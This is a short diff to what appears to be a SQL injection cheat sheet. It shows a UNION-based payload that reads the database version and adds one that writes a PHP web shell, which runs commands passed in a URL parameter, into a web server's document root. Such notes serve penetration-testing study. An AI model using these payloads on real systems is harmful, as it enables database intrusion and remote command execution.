@@ -28,6 +28,12 @@ man' UNION select 1,@@version,3,4,5,6;-- - [assuming column 3 content gets dipla
 --Need to figure out data type used by each column to know where to inject
 ```
 
+#### What's this?
+
+```
+‘ UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -’
+```
+
 ### Error Based&#x20;
 
 {% hint style="info" %}
